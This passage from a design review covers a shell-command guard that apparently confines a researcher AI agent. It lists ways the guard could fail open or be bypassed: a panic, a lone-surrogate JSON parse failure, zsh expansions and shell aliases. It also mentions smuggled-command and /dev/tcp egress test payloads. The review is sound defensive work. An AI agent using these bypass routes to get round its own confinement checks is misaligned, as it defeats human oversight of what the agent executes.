  dev-launcher route cannot work as described. `bin/accelerator` requires
  `.claude-plugin/plugin.json`, the verify shim and the release key in the
  plugin root. `dev_launcher_contained` also requires the launcher under
  `<plugin_root>/cli/target/`. Each failure exits `0` under `--fail-safe`,
  so the missing-binary case passes vacuously. Build the root as
  `test_accelerator_entrypoint.py`'s harness does, copy the launcher into
  `<root>/cli/target/debug/`, and assert the unverified-launcher warning
  and the specific exec failure.
- 🟡 **Performance** (Test Coverage, minor): One shared loopback listener
  cannot attribute connections across concurrent pool tasks. The `/dev/tcp`
  controls connect to it deliberately, which contradicts the "no
  connection" assertion. Give each pool worker its own listener with its
  port bound late, and run the controls against their own listener.
- 🔵 **Code Quality + Architecture + Correctness**: The `guard` column's
  rule ("any `$` outside single quotes") is worded differently from the
  lexer's (unescaped, outside single quotes and comments), and the same
  mismatch appears in item 12, the Desired End State and the scoping note.
  The re-probe step does not exempt the stricter set. Declare the stricter
  set once in code, as `Construct` variants, have the fixture test verify
  it, and use one wording everywhere.
- 🔵 **Code Quality + Architecture + Correctness**: Nothing says
  `FilePacingGate<C: Clock>` shares the `FetchPorts` clock instance. Under
  the stateful test clock, a separate copy mixes timelines. Share one
  handle, and test that an in-lock wait reduces the deadline.
- 🔵 **Test Coverage**: The cached-path assertion on stderr needs
  `CorruptCacheAndRefetchFailed` to carry the path. That change is
  unlisted, so the red test has no planned green step. The recovery text
  also needs pinning to that variant alone (Usability agrees: the single
  step does not fit signature or manifest refusals). Share
  `DEAD_RELEASE_URL` through a support module.
- 🔵 **Correctness**: The boundary-row list marks only 3 of about 17
  passing rows, and lists `>>/dev/null` twice.
- 🔵 **Security**: zsh `~NAME`, `~+`, `=cmd` and globs still feed
  path-shaped values into the usage-error echo, and the phase 9 docs
  overstate what the `$` rule closes. Aliases from the shell snapshot
  (for example oh-my-zsh global `G='| grep'`) are outside both the lexer
  and the harness. Re-probes can loosen the guard automatically.
- 🔵 **Code Quality**: `=(`, `>|` and `&>` are redundant under the general
  rules, and `per_request` is supplied twice.
- 🔵 **Usability**: The fixed SYNTAX hint gives quoting advice for pipes and
  chains, where it does not apply.

### Assessment

All six pass-6 majors are resolved, and correctness again found no row that
the rewritten lexer contradicts. The `$`/`<` tightening is sound and
costs nothing, since every profile invocation is a single-quoted literal.
Three of the four new majors are defects in the pass-6 test edits: the
`$SENTINEL` payloads, the smoke test's plugin root, and the shared
listener. All three have mechanical fixes. The fourth, fail-open on a
panic, is a real hole in the confinement argument, fixed with
`catch_unwind`. Two minors are each raised by three lenses and are cheap
to fix alongside: the stricter-set wording and the shared gate clock.

## Re-Review (Pass 8) — 2026-09-24T11:59:10+00:00

**Verdict:** COMMENT

The plan is acceptable but could be improved; see the two majors below.

### Previously Identified Issues

- 🟡 **Security**: Guard panic fails open — Resolved. A panic hook installed
  once the researcher is identified exits `2`, and it still holds under
  `panic = "abort"`. The differential fails on any other exit code.
- 🟡 **Correctness**: `$SENTINEL` masking — Resolved. The literal
  `touch smuggled` payload is detected through the empty per-string
  directory. A milder form of the same masking returns through `{port}`
  (see the new issues).
- 🟡 **Compatibility**: Smoke-test dev-launcher route — Resolved. Checked
  against every `bin/accelerator` gate. The `WARNING` line and the
  `failed to exec <path>` message are both emitted by default.
- 🟡 **Performance**: Shared listener — Resolved. Each worker has its own
  late-bound listener, and the controls run after the pool drains.
- 🔵 **Code Quality + Architecture + Correctness**: Stricter-set wording —
  Resolved. `STRICTER_THAN_CLAUDE_CODE` is declared once. Correctness found
  the fixture rule satisfiable against every 2.1.281 row except the
  inconclusive non-breaking-space row.
- 🔵 **Code Quality + Architecture + Correctness**: Gate clock — Resolved
  (`Rc<dyn Clock>` is shared, and a test pins it).
- 🔵 **Test Coverage**: Smoke-root detail — Resolved.
- 🔵 Still present from earlier passes:
  - the cached-path stderr change, and `DEAD_RELEASE_URL` sharing;
  - boundary rows left unmarked;
  - gate-refusal reason precedence;
  - the whole-call outcome of a failed confirmation (partially resolved);
  - the research import rule's `denied` list;
  - the on-delivered seam, `is_confined` returning `bool`, the
    `lock_contention` carrier, `deferral_after`, the `ErrorFeed` message,
    and `CredentialPorts` duplication;
  - redundant lexer entries, and `per_request` supplied twice;
  - the recovery step fitting every refusal, the fixed SYNTAX hint,
    Outcome precedence, uncoded exit-1 errors, the Denied row, and DOI
    quoting;
  - recall outside the lock, and log and cache growth;
  - changelog ordering;
  - the `~NAME` echo, snapshot aliases, and re-probe loosening outside
    the stricter set (partially resolved).

### New Issues Introduced

- 🟡 **Security** (low confidence): A researcher can make the stdin parse
  fail, and that fails open. Step 1 parses the whole payload before
  identification, and "malformed JSON passes". A lone UTF-16 surrogate
  escape (`\ud800`) in `tool_input.command` or `content` is valid
  JavaScript output that serde_json rejects, so the guard would pass the
  call unjudged. Fix: parse only `agent_id`, `agent_type`, `tool_name`
  and `cwd` before identification. Parse `tool_input` afterwards, where a
  failure becomes `Action::Unreadable` and blocks. Add a lone-surrogate
  wiring case.
- 🟡 **Correctness**: The guard may judge the `{port}` template. Its
  unquoted `{` always blocks, which masks `<` handling in the egress arm.
  Substitute the port before asking the guard, or use a placeholder with no
  shell-significant characters.
- 🔵 **Correctness**: The inconclusive non-breaking-space row cannot satisfy
  the fixture rule. Add an `inconclusive` verdict that the test skips, and
  keep the row as a boundary case. The differential never says to swap the
  fixture rows' `./probe` prefix. No control exercises a pool worker's own
  listener. Item 12's "quoted text without `$`" overstates what double
  quotes allow (a backtick or backslash-newline still blocks).
- 🔵 **Test Coverage**: The non-researcher panic case never reaches the
  panic, so the hook's scope is unpinned. Let the switch name its position.
  One combined wait log cannot tell pacing waits from retry waits, so a
  retry sleep held inside the lock would go undetected. Tag each line with
  its waiter and assert exact amounts. `make_harness` should be
  `make_installation`, without the stub server, and
  `ACCELERATOR_RESEARCH_BIN` should be absolute.
- 🔵 **Compatibility**: The smoke environment should clear
  `ACCELERATOR_LOG`, point `ACCELERATOR_CACHE_DIR` at a temp directory,
  and preserve the shim's mode. Changelog entries should land in the phase
  that makes each change (phases 2 and 7), and the list omits
  `--non-blocking`.
- 🔵 **Security**: The panic hook does not cover non-panic aborts (stack
  overflow, allocation failure) or a failing hook write. State that the
  lexer and path walk are iterative. Write with `let _ = writeln!` and then
  exit. Consider a command length cap.
- 🔵 **Usability**: `E_RESEARCH_GUARD_INTERNAL` falls under "correct and
  continue". Make it terminal, and document it in phase 9 as a blocking
  defect.
- 🔵 **Code Quality**: The panic hook drops the panic payload and location.
  `test-loopback` is growing into a general test-seam feature.
- 🔵 **Architecture**: `STRICTER_THAN_CLAUDE_CODE`'s visibility is
  unstated, so public-api may not pin it. The one-clock rule relies on
  wiring rather than the `PacingGate` signature.
- 🔵 **Performance**: The process-group wait has no per-string timeout, and
  the shells' stdin is inherited, so a wrongly passed string can hang the
  pool.

### Assessment

The plan has converged. Every pass-7 major and both shared minors are
resolved, correctness again found no contradiction between the lexer and
the measured baseline, and five of eight lenses report no major. Two
majors remain, below the REVISE threshold of three:
- the pre-identification parse. Its confidence is low, but the fix is
  cheap: parse `tool_input` only after identification.
- the `{port}` template masking, which needs a one-line fix.

Both are worth fixing before implementation. The long tail of minors can
be taken during implementation or left as accepted.

## Verdict Change — 2026-09-24T12:02:08+00:00

**Verdict:** APPROVE (changed from COMMENT by the reviewer)

Both pass-8 majors were fixed in the plan without a further review pass:
- 🟡 **Security**: A stdin parse failure the researcher could cause —
  Resolved. The guard now parses only the envelope (`agent_id`,
  `agent_type`, `tool_name`, `cwd`) before identification, and keeps
  `tool_input` raw. After identification, a `tool_input` parse failure is
  `Action::Unreadable` and blocks. A wiring case with a lone `\ud800`
  escape in `command` and in `content` pins both halves.
- 🟡 **Correctness**: The guard judging the `{port}` template — Resolved.
  Each pool task substitutes its worker's port before asking the guard, so
  the verdict and the execution see the same string.

The pass-8 minors remain open and are accepted for implementation. The plan
is marked `ready`.
